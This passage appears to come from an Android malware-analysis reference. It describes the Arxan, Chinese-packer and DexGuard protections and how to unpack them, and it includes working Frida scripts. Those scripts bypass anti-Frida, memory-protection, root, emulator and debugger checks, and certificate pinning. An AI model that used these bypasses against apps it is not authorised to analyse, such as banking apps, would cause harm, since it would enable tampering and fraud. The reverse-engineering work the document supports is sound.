management"},{"location":"packers/arxan/#banking-context","title":"Banking Context","text":"<p>Arxan is one of the most widely deployed protectors across global banking apps. A documented case study shows a major Brazilian bank using Digital.ai Application Protection to successfully defend against the BrasDex banking trojan while other institutions were compromised. Banking deployments typically combine:</p> <ul> <li>Guard network for code integrity</li> <li>White-box cryptography for key protection</li> <li>RASP (Runtime Application Self-Protection) via App Aware for real-time monitoring</li> <li>Server-side telemetry for attack pattern analysis</li> </ul> <p>For analysts reverse-engineering banking apps protected by Arxan, expect the full protection stack active simultaneously, with multiple guard layers requiring systematic bypass before reaching target functionality.</p>"},{"location":"packers/arxan/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Arxan DexGuard Virbox Chinese Packers Primary layer Native (ARM/ELF) DEX (Dalvik) DEX + Native VM DEX-in-assets Guard network Mesh of interdependent guards Independent checks Not applicable Not applicable White-box crypto TransformIT (dedicated) Not included Not included Not included Code virtualization No (uses obfuscation) Optional, limited Core feature Not available Anti-debug depth Deep (ptrace, timing, breakpoint scan) Comprehensive (ptrace, JDWP, Frida) Moderate (ptrace, flags) Basic (ptrace) Self-repair Repair guards restore tampered code No self-repair No self-repair No self-repair Primary market Banking, gaming, enterprise Banking, general Android Chinese market Chinese market Unpacking difficulty High (distributed guards, native-level) Medium (Frida hooks effective) High (VM interpretation) Low (standard DEX dump)"},{"location":"packers/arxan/#references","title":"References","text":"<ul> <li>Digital.ai Application Protection</li> <li>Arxan Technologies -- Wikipedia</li> <li>APKiD -- Android Application Identifier</li> <li>APKiD Arxan Detection Rules (Issue #24)</li> <li>Frida GuardIT/Arxan Bypass Discussion (Issue #949)</li> <li>Giovanni Rocca -- Reverse Engineering Supercell (Arxan)</li> <li>ZygiskFrida -- Stealthy Frida Injection</li> <li>Digital.ai App Security Saves Bank Millions</li> <li>Arxan White-Box Cryptography Solution Brief</li> </ul>"},{"location":"packers/chinese-packers/","title":"Chinese Packers","text":"<p>Chinese packing services dominate Android malware protection. Since Google Play is unavailable in China, apps distribute through OEM stores (Tencent, Baidu, Xiaomi) that don't enforce the same restrictions. Chinese packers are free or cheap, widely available, and frequently abused by malware authors.</p>"},{"location":"packers/chinese-packers/#overview","title":"Overview","text":"Packer Vendor Free Tier APKiD Signature Tencent Legu Tencent Yes <code>packer : Tencent Legu</code> 360 Jiagu Qihoo 360 Yes <code>packer : Qihoo 360</code> Bangcle (SecNeo) Bangcle Yes <code>packer : Bangcle</code> Baidu Reinforcement Baidu Yes <code>packer : Baidu</code> iJiami iJiami Limited <code>packer : iJiami</code> NeteaseYiDun NetEase Limited <code>packer : NetEase</code> APKProtect Nagain Yes <code>packer : APKProtect</code>"},{"location":"packers/chinese-packers/#tencent-legu","title":"Tencent Legu","text":"<p>The most widely used Chinese packer. Free protection service integrated with Tencent's app distribution ecosystem.</p>"},{"location":"packers/chinese-packers/#identification","title":"Identification","text":"Artifact Description Native library <code>libshell-super.2019.so</code>, <code>libshella-*.so</code>, or <code>libtxoprot.so</code> DEX stub Minimal <code>classes.dex</code> with shell loader class Asset files Encrypted DEX in <code>assets/</code> (e.g., <code>classes.dex.dat</code>) Metadata <code>tencent_stub</code> in APK metadata"},{"location":"packers/chinese-packers/#protection","title":"Protection","text":"<ul> <li>DEX encryption with AES</li> <li>Native library anti-debugging (ptrace self-attach)</li> <li>Emulator detection via hardware properties</li> <li>Anti-Frida checks (port scanning, /proc/maps inspection)</li> <li>String encryption in native layer</li> <li>Code segment checksumming</li> </ul>"},{"location":"packers/chinese-packers/#unpacking","title":"Unpacking","text":"<ol> <li>Hook <code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> to intercept DEX loading</li> <li>Dump DEX bytes from memory after native loader decrypts</li> <li>Alternative: use <code>frida-dexdump</code> which scans process memory for DEX headers</li> </ol>"},{"location":"packers/chinese-packers/#qihoo-360-jiagu","title":"Qihoo 360 Jiagu","text":"<p>Free protection from Qihoo 360, one of China's largest security companies. Frequently seen in both legitimate Chinese apps and malware.</p>"},{"location":"packers/chinese-packers/#identification_1","title":"Identification","text":"Artifact Description Native library <code>libjiagu.so</code>, <code>libjiagu_art.so</code>, <code>libjiagu_x86.so</code> DEX stub Stub application class loading encrypted payload Asset files <code>classes.dat</code>, <code>classes0.dex</code> in <code>assets/</code> Package prefix Loader classes in <code>com.qihoo.util</code> or <code>com.stub</code>"},{"location":"packers/chinese-packers/#protection_1","title":"Protection","text":"<ul> <li>Multi-layer DEX encryption</li> <li>Native anti-debugging with signal handlers</li> <li>VM detection via <code>/proc/cpuinfo</code> and hardware serial</li> <li>Function-level encryption (selected methods encrypted individually)</li> <li>Anti-memory-dump techniques (mprotect manipulation)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_1","title":"Unpacking","text":"<p>Hook <code>dvmLoadNativeCode</code> or <code>JNI_OnLoad</code> in the jiagu library. The decrypted DEX is written to a temporary file before loading; monitoring file creation in the app's data directory can capture it.</p>"},{"location":"packers/chinese-packers/#bangcle-secneo","title":"Bangcle (SecNeo)","text":"<p>One of the earliest Chinese packers. Still encountered in older malware samples.</p>"},{"location":"packers/chinese-packers/#identification_2","title":"Identification","text":"Artifact Description Native library <code>libsecexe.so</code>, <code>libsecmain.so</code>, <code>libSecShell.so</code> DEX stub Minimal loader calling native initialization Asset files <code>classes.jar</code> or encrypted DEX in <code>assets/</code>"},{"location":"packers/chinese-packers/#protection_2","title":"Protection","text":"<ul> <li>DEX encryption and dynamic loading</li> <li>Anti-debugging via ptrace</li> <li>Root detection</li> <li>Basic emulator detection</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_2","title":"Unpacking","text":"<p>Older Bangcle versions use straightforward DEX-in-assets encryption. The native library decrypts and writes a temporary DEX file. Hook file operations or dump from <code>/proc/&lt;pid&gt;/maps</code>.</p>"},{"location":"packers/chinese-packers/#common-unpacking-strategy","title":"Common Unpacking Strategy","text":"<p>All Chinese packers follow a similar pattern:</p> <ol> <li>Stub <code>Application</code> class loads native library</li> <li>Native library decrypts the real DEX from assets</li> <li>Decrypted DEX loaded via <code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code></li> <li>Real <code>Application</code> class instantiated and lifecycle delegated</li> </ol> <p>The universal approach:</p> <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optimizedDir, libraryPath, parent) {\n        console.log(\"[DexClassLoader] Loading: \" + dexPath);\n        this.$init(dexPath, optimizedDir, libraryPath, parent);\n    };\n\n    var InMemoryDexClassLoader = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemoryDexClassLoader.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\").implementation = function(buf, parent) {\n        console.log(\"[InMemoryDexClassLoader] Size: \" + buf.remaining());\n        this.$init(buf, parent);\n    };\n});\n</code></pre> <p>For automated dumping, <code>frida-dexdump</code> handles most Chinese packers without family-specific scripts.</p>"},{"location":"packers/chinese-packers/#malware-usage","title":"Malware Usage","text":"<p>Chinese packers are the most common protection found on malware samples:</p> Packer Notable Malware Usage Tencent Legu Triada firmware variants, Chinese adware Qihoo 360 Jiagu Banking trojans, Chinese-origin malware Bangcle Older banking trojans, BankBot variants Baidu Adware, Chinese-targeted malware <p>These packers are freely available, making them the default choice for budget-conscious malware operators. The protection is adequate against automated AV scanning but yields to manual analysis with Frida-based unpacking.</p>"},{"location":"packers/chinese-packers/#baidu-reinforcement","title":"Baidu Reinforcement","text":"<p>Baidu's free app protection service. Less sophisticated than Tencent Legu or Qihoo 360 but still encountered in malware samples, particularly Chinese-targeted adware and data-harvesting families.</p>"},{"location":"packers/chinese-packers/#identification_3","title":"Identification","text":"Artifact Description Native library <code>libbaiduprotect.so</code>, <code>libprotectClass.so</code> DEX stub Application class delegating to Baidu loader Asset files Encrypted payload in <code>assets/baiduprotect/</code>"},{"location":"packers/chinese-packers/#protection_3","title":"Protection","text":"<ul> <li>DEX encryption with custom algorithm</li> <li>Basic anti-debugging (ptrace)</li> <li>Emulator detection via Build properties</li> <li>No function-level encryption (entire DEX encrypted as blob)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_3","title":"Unpacking","text":"<p>Straightforward DEX dump. The native library decrypts the entire DEX payload in one pass and loads via standard class loader. Hook <code>DexClassLoader</code> or dump from memory after load.</p>"},{"location":"packers/chinese-packers/#ijiami","title":"iJiami","text":"<p>Commercial packing service offering both free and paid tiers. The free tier provides basic encryption; paid tiers add anti-tampering, root detection, and code virtualization.</p>"},{"location":"packers/chinese-packers/#identification_4","title":"Identification","text":"Artifact Description Native library <code>libexecmain.so</code>, <code>libexec.so</code> DEX stub Shell class invoking native decryption Asset files <code>ijiami.dat</code> or encrypted DEX in <code>assets/ijiami/</code> Metadata <code>ijiami</code> references in APK resources"},{"location":"packers/chinese-packers/#protection_4","title":"Protection","text":"<ul> <li>Multi-layer DEX encryption</li> <li>Anti-debugging with signal handling</li> <li>Root detection (su, Magisk, system partition checks)</li> <li>Paid tier: method-level encryption, code virtualization</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_4","title":"Unpacking","text":"<p>Free tier: standard DEX dump via <code>frida-dexdump</code> or class loader hook. Paid tier with method-level encryption requires hooking individual method decryption calls, similar to DexGuard string decryption approach.</p>"},{"location":"packers/chinese-packers/#neteaseyidun","title":"NeteaseYiDun","text":"<p>NetEase's application security service, integrated with their gaming ecosystem. Most commonly seen in Chinese mobile games but occasionally in malware targeting Chinese users.</p>"},{"location":"packers/chinese-packers/#identification_5","title":"Identification","text":"Artifact Description Native library <code>libnesec.so</code>, <code>libNetHTProtect.so</code> Package <code>com.netease.nis.wrapper</code> package in DEX stub Asset files Encrypted payload in <code>assets/nis/</code>"},{"location":"packers/chinese-packers/#protection_5","title":"Protection","text":"<ul> <li>DEX encryption with multi-key scheme</li> <li>Anti-debugging and anti-hooking</li> <li>Integrity verification of native libraries</li> <li>Memory protection (mprotect on decrypted regions)</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_5","title":"Unpacking","text":"<p>Hook before mprotect calls revoke read access. The decrypted DEX resides in memory briefly before protection flags are set. Timing the dump is critical. <code>frida-dexdump</code> works if executed during the loading window.</p>"},{"location":"packers/chinese-packers/#apkprotect","title":"APKProtect","text":"<p>Nagain's free protection service. Less common than the major packers but still appears in budget malware operations.</p>"},{"location":"packers/chinese-packers/#identification_6","title":"Identification","text":"Artifact Description Native library <code>libAPKProtect.so</code> Asset files Encrypted DEX in <code>assets/apk_protect/</code>"},{"location":"packers/chinese-packers/#protection_6","title":"Protection","text":"<ul> <li>DEX encryption</li> <li>Basic anti-debugging</li> <li>Minimal obfuscation compared to competitors</li> </ul>"},{"location":"packers/chinese-packers/#unpacking_6","title":"Unpacking","text":"<p>Simple DEX dump. <code>frida-dexdump</code> handles APKProtect without special configuration.</p>"},{"location":"packers/chinese-packers/#advanced-unpacking-techniques","title":"Advanced Unpacking Techniques","text":""},{"location":"packers/chinese-packers/#tencent-legu-anti-frida-bypass","title":"Tencent Legu Anti-Frida Bypass","text":"<p>Tencent Legu checks for Frida by scanning <code>/proc/self/maps</code> for <code>frida-agent</code> strings and probing port 27042. A combined bypass hooks these checks at the native level:</p> <pre><code>var openPtr = Module.findExportByName(\"libc.so\", \"open\");\nInterceptor.attach(openPtr, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; this.path.indexOf(\"/proc\") !== -1 &amp;&amp;\n            this.path.indexOf(\"/maps\") !== -1) {\n            this.isMaps = true;\n        }\n    }\n});\n\nvar readPtr = Module.findExportByName(\"libc.so\", \"read\");\nInterceptor.attach(readPtr, {\n    onLeave: function(retval) {\n        if (this.isMaps) {\n            var buf = this.context.x1;\n            var content = buf.readUtf8String();\n            if (content &amp;&amp; content.indexOf(\"frida\") !== -1) {\n                buf.writeUtf8String(content.replace(/frida/g, \"aaaaa\"));\n            }\n        }\n    }\n});\n\nvar connectPtr = Module.findExportByName(\"libc.so\", \"connect\");\nInterceptor.attach(connectPtr, {\n    onEnter: function(args) {\n        var sockaddr = args[1];\n        var port = (sockaddr.add(2).readU8() &lt;&lt; 8) | sockaddr.add(3).readU8();\n        if (port === 27042) {\n            args[1] = ptr(0);\n        }\n    }\n});\n</code></pre> <p>For Legu versions after 2023, the packer also scans for <code>frida-gadget</code> in loaded modules and checks named pipes in <code>/proc/self/fd/</code>. The Frida naming convention for renamed gadgets can bypass the string-based check. Using <code>frida-server</code> with <code>--listen 0.0.0.0:1337</code> on a non-standard port avoids port scanning detection.</p>"},{"location":"packers/chinese-packers/#neteaseyidun-memory-protection-bypass","title":"NeteaseYiDun Memory Protection Bypass","text":"<p>NeteaseYiDun uses <code>mprotect</code> to remove read permissions from memory pages containing the decrypted DEX after loading. Hooking <code>mprotect</code> prevents this:</p> <pre><code>var mprotect = Module.findExportByName(\"libc.so\", \"mprotect\");\nInterceptor.attach(mprotect, {\n    onEnter: function(args) {\n        this.addr = args[0];\n        this.size = args[1].toInt32();\n        this.prot = args[2].toInt32();\n        if (this.prot === 0) {\n            console.log(\"[mprotect] Blocking PROT_NONE at \" +\n                this.addr + \" size=\" + this.size);\n            args[2] = ptr(1);\n        }\n    }\n});\n</code></pre> <p>After bypassing, <code>frida-dexdump</code> can scan the readable memory for DEX headers.</p>"},{"location":"packers/chinese-packers/#qihoo-360-function-level-decryption","title":"Qihoo 360 Function-Level Decryption","text":"<p>360 Jiagu's advanced mode encrypts individual methods rather than the entire DEX. Each method body is encrypted and only decrypted when called. To recover all methods, force class initialization:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.startsWith(\"com.target.\")) {\n                try {\n                    var cls = Java.use(className);\n                    var methods = cls.class.getDeclaredMethods();\n                    methods.forEach(function(method) {\n                        try {\n                            method.setAccessible(true);\n                        } catch(e) {}\n                    });\n                } catch(e) {}\n            }\n        },\n        onComplete: function() {\n            console.log(\"Class enumeration complete, dumping DEX...\");\n        }\n    });\n});\n</code></pre> <p>After forcing all classes to load (which triggers method decryption), dump the DEX from memory. The decrypted method bodies are now in place.</p>"},{"location":"packers/chinese-packers/#automated-unpacking-pipeline","title":"Automated Unpacking Pipeline","text":"<p>For batch processing multiple Chinese-packed samples, a repeatable pipeline:</p> <pre><code>1. APKiD identification -&gt; route to packer-specific bypass script\n2. Install on rooted device with Magisk + Shamiko (hides root)\n3. Spawn with Frida using combined anti-analysis bypass\n4. Wait for app initialization (3-5 seconds)\n5. Run frida-dexdump -&gt; collect all DEX files\n6. Filter dumped DEX by size (&gt; 50KB, skip framework DEX)\n7. Decompile with jadx -&gt; verify recovered code\n8. Extract IOCs (strings, URLs, package names)\n</code></pre> <p>The frida-dexdump tool handles steps 4-6 in a single command:</p> <pre><code>frida-dexdump -FU -o /output/dir/\n</code></pre> <p>For samples with aggressive anti-Frida, use Hluwa's FART (Frida ART Runtime) which dumps DEX at the ART runtime level, bypassing userspace detection entirely. FART modifies the ART interpreter to dump DEX bytecode during method execution, operating below the level where packers can detect instrumentation.</p>"},{"location":"packers/chinese-packers/#detection-and-triage","title":"Detection and Triage","text":""},{"location":"packers/chinese-packers/#rapid-packer-identification","title":"Rapid Packer Identification","text":"<pre><code>apkid sample.apk\n</code></pre> <p>If APKiD is unavailable, check for known native library markers:</p> Library Name Packer <code>libshella*.so</code>, <code>libshell-super*.so</code> Tencent Legu <code>libjiagu*.so</code> Qihoo 360 <code>libsecexe.so</code>, <code>libSecShell.so</code> Bangcle <code>libbaiduprotect.so</code> Baidu <code>libexecmain.so</code> iJiami <code>libnesec.so</code> NeteaseYiDun <code>libAPKProtect.so</code> APKProtect <code>libvdog.so</code> Virbox <code>libdexguard.so</code> DexGuard"},{"location":"packers/chinese-packers/#packer-complexity-ranking","title":"Packer Complexity Ranking","text":"<p>From easiest to hardest to unpack:</p> Tier Packers Approach Easy APKProtect, Baidu, Bangcle (old) <code>frida-dexdump</code> works immediately Medium Tencent Legu, Qihoo 360, iJiami (free) <code>frida-dexdump</code> + class loader hooks Hard NeteaseYiDun, iJiami (paid), DexGuard Timed dumps, string decryption hooks needed Expert Virbox (virtualized), DexGuard (virtualized) VM analysis required, see Virbox page"},{"location":"packers/chinese-packers/#references","title":"References","text":"<ul> <li>APKiD Packer Signatures</li> <li>frida-dexdump</li> </ul>"},{"location":"packers/dexguard/","title":"DexGuard","text":"<p>DexGuard is a commercial Android app protection tool developed by Guardsquare (Belgium). It extends ProGuard/R8 with encryption, tamper detection, and environmental checks. The most commonly encountered commercial protector in Android malware analysis due to its effectiveness and availability.</p>"},{"location":"packers/dexguard/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Guardsquare Origin Belgium Type Commercial Packer/Protector/Obfuscator Platforms Android Companion AppSweep (security testing) Relationship Guardsquare also maintains ProGuard (open-source) and contributes to R8"},{"location":"packers/dexguard/#build-integration","title":"Build Integration","text":"<p>DexGuard operates as a Gradle plugin that runs at build time, requiring access to the application source code. This is a fundamental architectural difference from post-build protectors like DexProtector, which operate on compiled APK/AAB artifacts without source access.</p>"},{"location":"packers/dexguard/#configuration-files","title":"Configuration Files","text":"<p>DexGuard uses two primary configuration files in the project root:</p> <ul> <li><code>dexguard-project.txt</code> -- project-wide protection settings applied to all build variants</li> <li><code>dexguard-release.txt</code> -- release-specific settings (typically stronger protection, applied only to release builds)</li> </ul> <p>These files use the same syntax as ProGuard/R8 rules with additional DexGuard-specific directives:</p> <pre><code>-encryptstrings class com.target.app.**\n-encryptclasses class com.target.app.core.**\n-accessthroughreflection class com.target.app.crypto.** { *; }\n-encryptassetfiles assets/config.json\n-detectemulators com.target.app.SecurityCallback\n-detectroot com.target.app.SecurityCallback\n-detecthookingframeworks com.target.app.SecurityCallback\n</code></pre>"},{"location":"packers/dexguard/#proguardr8-relationship","title":"ProGuard/R8 Relationship","text":"<p>DexGuard extends the ProGuard rule format. Any valid ProGuard configuration works inside DexGuard config files. DexGuard adds encryption and RASP directives on top of the standard obfuscation rules. Projects migrating from ProGuard to DexGuard can keep their existing <code>-keep</code> rules and layer DexGuard-specific protections incrementally.</p> <p>Because DexGuard replaces ProGuard/R8 in the build pipeline rather than running alongside it, the two cannot be used simultaneously. The Gradle plugin intercepts the compilation step where R8 would normally run.</p>"},{"location":"packers/dexguard/#contrast-with-post-build-tools","title":"Contrast with Post-Build Tools","text":"Aspect DexGuard (Build-Time) DexProtector (Post-Build) Source required Yes No Integration point Gradle plugin Command-line tool on compiled APK Polymorphism Per-build variation (different keys, names) Deterministic output Configuration ProGuard-compatible rule files Standalone configuration CI/CD fit Native Gradle task Additional build step Malware use case Requires cracked plugin + build environment Can protect any existing APK <p>The build-time integration is why cracked DexGuard versions are more complex to deploy than post-build tools. The attacker needs a functional Gradle environment with the DexGuard plugin correctly registered, not just a command-line wrapper.</p>"},{"location":"packers/dexguard/#identification","title":"Identification","text":""},{"location":"packers/dexguard/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies DexGuard with signatures like:</p> <pre><code>anti_disassembly : DexGuard (string encryption)\nanti_vm : DexGuard (emulator check)\npacker : DexGuard\nobfuscator : DexGuard\n</code></pre>"},{"location":"packers/dexguard/#file-artifacts","title":"File Artifacts","text":"Artifact Description String encoding classes Classes with names like <code>o</code>, <code>oo</code>, <code>ooo</code> containing string decryption methods Asset files Encrypted DEX payloads in <code>assets/</code> with non-standard extensions Native libraries <code>libdexguard.so</code> or obfuscated native stubs Class names Aggressive single-character naming across all packages Reflection-heavy initialization Application class with extensive reflection in <code>attachBaseContext</code>"},{"location":"packers/dexguard/#distinguishing-from-proguardr8","title":"Distinguishing from ProGuard/R8","text":"<p>ProGuard/R8 only performs name obfuscation and dead code removal. DexGuard adds:</p> <ul> <li>String encryption (strings are decrypted at runtime via method calls)</li> <li>Class encryption (entire classes encrypted, loaded dynamically)</li> <li>Resource encryption</li> <li>Asset encryption</li> <li>Native code obfuscation</li> <li>Anti-tampering checks</li> <li>Environmental checks (root, debug, emulator)</li> </ul> <p>If decompiled code shows method calls returning strings rather than string literals, it is likely DexGuard string encryption.</p>"},{"location":"packers/dexguard/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/dexguard/#string-encryption","title":"String Encryption","text":"<p>Replaces string literals with method calls that decrypt at runtime:</p> <pre><code>String url = ooo.o(\"encrypted_bytes_here\");\n</code></pre> <p>The decryption method uses XOR, AES, or custom algorithms. Keys may be derived from class names, method signatures, or hardcoded values.</p>"},{"location":"packers/dexguard/#class-encryption","title":"Class Encryption","text":"<p>Selected classes are encrypted and stored in assets or resources. At runtime, a custom class loader decrypts and loads them. This defeats static analysis of protected classes entirely.</p>"},{"location":"packers/dexguard/#resource-and-asset-encryption","title":"Resource and Asset Encryption","text":"<p>Layout XML files, strings, and assets can be encrypted. Decryption happens transparently through a patched <code>AssetManager</code> or resource loading hook.</p>"},{"location":"packers/dexguard/#code-virtualization","title":"Code Virtualization","text":"<p>Critical methods can be converted to a proprietary bytecode format executed by an embedded interpreter. Similar to Virbox DEX virtualization but with a different instruction set.</p>"},{"location":"packers/dexguard/#tamper-detection","title":"Tamper Detection","text":"<ul> <li>APK signature verification against expected certificate</li> <li>DEX file checksum validation</li> <li>Native library integrity checks</li> <li>Response: crash, silent data corruption, or delayed termination</li> </ul>"},{"location":"packers/dexguard/#environmental-checks","title":"Environmental Checks","text":"Check Detection Method Root su binary, Magisk, SuperSU, system partition state Emulator Build properties, hardware sensors, telephony state Debugger TracerPid, JDWP, ptrace status Frida Port 27042, frida-agent in /proc/maps, named pipes Xposed XposedBridge class presence, stack trace inspection"},{"location":"packers/dexguard/#polymorphic-builds","title":"Polymorphic Builds","text":"<p>Each DexGuard build produces a structurally unique output. Encryption keys, obfuscated class names, string decryption routines, and control flow transformations all vary between builds of the same application. Two APKs built from identical source with identical DexGuard configuration will have different bytecode.</p> <p>This is DexGuard's most significant defensive property. A Frida script written to hook string decryption in build A will fail on build B because the decryption class name, method signature, and key derivation have all changed. Attackers must re-analyze each build individually. Automated tooling that relies on fixed class names or method patterns breaks across versions.</p> <p>For malware analysis, this means samples from different campaigns or distribution waves require separate unpacking effort even when the underlying malware is identical. Contrast this with DexProtector or Chinese packers, where a single unpacking script transfers across all protected samples.</p>"},{"location":"packers/dexguard/#certificate-pinning","title":"Certificate Pinning","text":"<p>DexGuard includes a built-in SSL/TLS certificate pinning implementation that operates at the native layer, independent of OkHttp's <code>CertificatePinner</code> or Android's <code>NetworkSecurityConfig</code>. The pinning configuration is specified in the DexGuard config file and compiled into the protection layer at build time.</p> <p>This means standard pinning bypass approaches that target OkHttp or <code>TrustManager</code> may be insufficient. The native-level pinning check runs before or alongside Java-layer networking, and a complete bypass requires hooking both layers. Objection's <code>android sslpinning disable</code> covers common Java-level patterns but may miss DexGuard's native implementation.</p>"},{"location":"packers/dexguard/#native-code-obfuscation","title":"Native Code Obfuscation","text":"<p>DexGuard protects JNI code in addition to DEX bytecode. Native libraries linked to the project can receive:</p> <ul> <li>Function-level control flow flattening</li> <li>String encryption within native code</li> <li>Symbol stripping beyond standard <code>strip</code></li> <li>Arithmetic obfuscation of constants</li> </ul> <p>This protection applies to the developer's own native code, not just DexGuard's runtime libraries. When analyzing a DexGuard-protected app that includes JNI components, expect obfuscated native functions that resist standard Ghidra/IDA analysis patterns.</p>"},{"location":"packers/dexguard/#reflection-api-obfuscation","title":"Reflection API Obfuscation","text":"<p>DexGuard encrypts reflection calls (<code>Class.forName()</code>, <code>Method.invoke()</code>, field access) so that the target class and method names are not visible in the bytecode. Instead of a plaintext string like <code>\"com.target.SensitiveClass\"</code>, the reflection target is resolved through the same encrypted string pipeline used for regular string encryption.</p> <p>In decompiled output, this appears as:</p> <pre><code>Class cls = Class.forName(ooo.o(new byte[]{...}));\nMethod m = cls.getDeclaredMethod(oo.o(new byte[]{...}), paramTypes);\nm.invoke(instance, args);\n</code></pre> <p>Hooking the string decryption methods captures these reflection targets alongside other decrypted strings, revealing the hidden class and method references in one pass.</p>"},{"location":"packers/dexguard/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/dexguard/#frida-based-string-decryption","title":"Frida-Based String Decryption","text":"<p>Hook the string decryption methods to log all decrypted strings:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.match(/^[o]+$/)) {\n                try {\n                    var cls = Java.use(className);\n                    var methods = cls.class.getDeclaredMethods();\n                    methods.forEach(function(method) {\n                        if (method.getReturnType().getName() === \"java.lang.String\") {\n                            var methodName = method.getName();\n                            cls[methodName].overload(\"[B\").implementation = function(arr) {\n                                var result = this[methodName](arr);\n                                console.log(className + \".\" + methodName + \" -&gt; \" + result);\n                                return result;\n                            };\n                        }\n                    });\n                } catch(e) {}\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"packers/dexguard/#dex-dumping","title":"DEX Dumping","text":"<p>For class-encrypted builds, dump the decrypted DEX from memory after the class loader has processed it. See Dynamic Analysis for DEX dumping techniques.</p>"},{"location":"packers/dexguard/#class-loader-hook-for-encrypted-classes","title":"Class Loader Hook for Encrypted Classes","text":"<p>When DexGuard uses class encryption, the encrypted payload is decrypted and loaded through a custom <code>ClassLoader</code>. Hooking <code>ClassLoader.loadClass</code> and <code>DexFile</code> operations captures classes as they are decrypted:</p> <pre><code>Java.perform(function() {\n    var ClassLoader = Java.use(\"java.lang.ClassLoader\");\n    ClassLoader.loadClass.overload(\"java.lang.String\", \"boolean\").implementation = function(name, resolve) {\n        var result = this.loadClass(name, resolve);\n        console.log(\"loadClass: \" + name);\n        return result;\n    };\n\n    var DexFile = Java.use(\"dalvik.system.DexFile\");\n    DexFile.loadDex.overload(\"java.lang.String\", \"java.lang.String\", \"int\").implementation = function(src, out, flags) {\n        console.log(\"DexFile.loadDex src=\" + src + \" out=\" + out);\n        return this.loadDex(src, out, flags);\n    };\n});\n</code></pre> <p>This reveals the sequence of dynamically loaded classes and the file paths where decrypted DEX files are temporarily written before loading.</p>"},{"location":"packers/dexguard/#environmental-check-bypass-combined","title":"Environmental Check Bypass (Combined)","text":"<p>DexGuard runs root, emulator, and debugger checks early in the initialization sequence. A combined bypass script handles all three vectors in a single Frida session:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n\nvar fopen = Module.findExportByName(\"libc.so\", \"fopen\");\nInterceptor.attach(fopen, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; (this.path.indexOf(\"/su\") !== -1 ||\n            this.path.indexOf(\"magisk\") !== -1 ||\n            this.path.indexOf(\"supersu\") !== -1)) {\n            retval.replace(ptr(0));\n        }\n    }\n});\n\nvar prop_get = Module.findExportByName(\"libc.so\", \"__system_property_get\");\nInterceptor.attach(prop_get, {\n    onEnter: function(args) {\n        this.name = args[0].readUtf8String();\n        this.value = args[1];\n    },\n    onLeave: function(retval) {\n        if (this.name === \"ro.debuggable\") {\n            this.value.writeUtf8String(\"0\");\n        }\n        if (this.name === \"ro.hardware\") {\n            this.value.writeUtf8String(\"qcom\");\n        }\n        if (this.name === \"ro.product.model\") {\n            this.value.writeUtf8String(\"SM-G998B\");\n        }\n    }\n});\n\nvar connect = Module.findExportByName(\"libc.so\", \"connect\");\nInterceptor.attach(connect, {\n    onEnter: function(args) {\n        var sockaddr = args[1];\n        var port = (sockaddr.add(2).readU8() &lt;&lt; 8) | sockaddr.add(3).readU8();\n        if (port === 27042) {\n            args[1] = ptr(0);\n        }\n    }\n});\n</code></pre> <p>This script blocks process termination, spoofs system properties to hide emulator and root indicators, blocks <code>su</code>/Magisk file access, and prevents Frida port detection. Use with <code>frida -f</code> in spawn mode for early injection.</p>"},{"location":"packers/dexguard/#certificate-pinning-bypass","title":"Certificate Pinning Bypass","text":"<p>For DexGuard's native-level certificate pinning, a layered approach covers both Java and native implementations:</p> <pre><code>Java.perform(function() {\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.checkTrustedRecursive.implementation = function() {\n        return Java.use(\"java.util.ArrayList\").$new();\n    };\n\n    try {\n        var DGPinning = Java.use(\"com.guardsquare.dexguard.runtime.net.SSLPinning\");\n        DGPinning.checkServerTrusted.implementation = function() {};\n    } catch(e) {}\n});\n\nvar SSL_CTX_set_custom_verify = Module.findExportByName(\"libssl.so\", \"SSL_CTX_set_custom_verify\");\nif (SSL_CTX_set_custom_verify) {\n    Interceptor.attach(SSL_CTX_set_custom_verify, {\n        onEnter: function(args) {\n            args[2] = ptr(0);\n        }\n    });\n}\n</code></pre> <p>The DexGuard pinning class name varies across builds due to polymorphism. The <code>com.guardsquare.dexguard.runtime.net.SSLPinning</code> path works for some builds but may need adjustment. reFrida includes SSL pinning bypass snippets that cover multiple DexGuard patterns through class enumeration rather than hardcoded names.</p>"},{"location":"packers/dexguard/#jadx-frida-combined-workflow","title":"JADX + Frida Combined Workflow","text":"<p>The most effective DexGuard analysis combines static and dynamic approaches to reconstruct a readable APK:</p> <pre><code>1. Open the APK in JADX -&gt; identify string decryption classes and encrypted assets\n2. Spawn the app with Frida, hook string decryption methods\n3. Exercise all app functionality -&gt; collect decrypted strings\n4. Run frida-dexdump to capture all loaded DEX files from memory\n5. Replace the original classes.dex with the dumped DEX files\n6. Open the reconstructed APK in JADX\n7. Use the 